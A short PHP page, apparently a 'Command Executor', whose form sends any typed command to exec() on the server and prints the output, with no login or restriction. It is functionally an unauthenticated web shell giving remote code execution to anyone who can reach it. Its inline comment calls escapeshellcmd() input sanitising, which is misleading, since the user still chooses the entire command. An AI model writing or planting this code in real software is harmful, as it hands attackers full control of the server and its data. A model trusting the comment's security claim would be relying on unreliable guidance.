<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = escapeshellcmd($_POST['command']); // Sanitize input
    $output = [];
    $returnVar = 0;

    // Execute the command
    exec($command . " 2>&1", $output, $returnVar);

    // Display output
    echo "<h3>Command Output:</h3>";
    echo "<pre>" . implode("\n", $output) . "</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>
</head>
<body>
    <h1>Execute Terminal Commands</h1>
    <form method="post">
        <label for="command">Enter Command:</label><br>
        <input type="text" id="command" name="command" required><br><br>
        <input type="submit" value="Execute">
    </form>
</body>
</html>